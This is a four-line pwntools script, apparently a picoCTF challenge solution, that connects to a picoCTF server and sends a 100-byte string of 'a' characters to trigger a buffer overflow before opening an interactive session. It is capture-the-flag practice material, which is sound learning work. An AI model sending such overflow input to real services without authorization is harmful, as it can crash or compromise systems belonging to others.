from pwn import *
r = remote('saturn.picoctf.net', 65355)
r.sendline(b'a' * 100)
r.interactive()
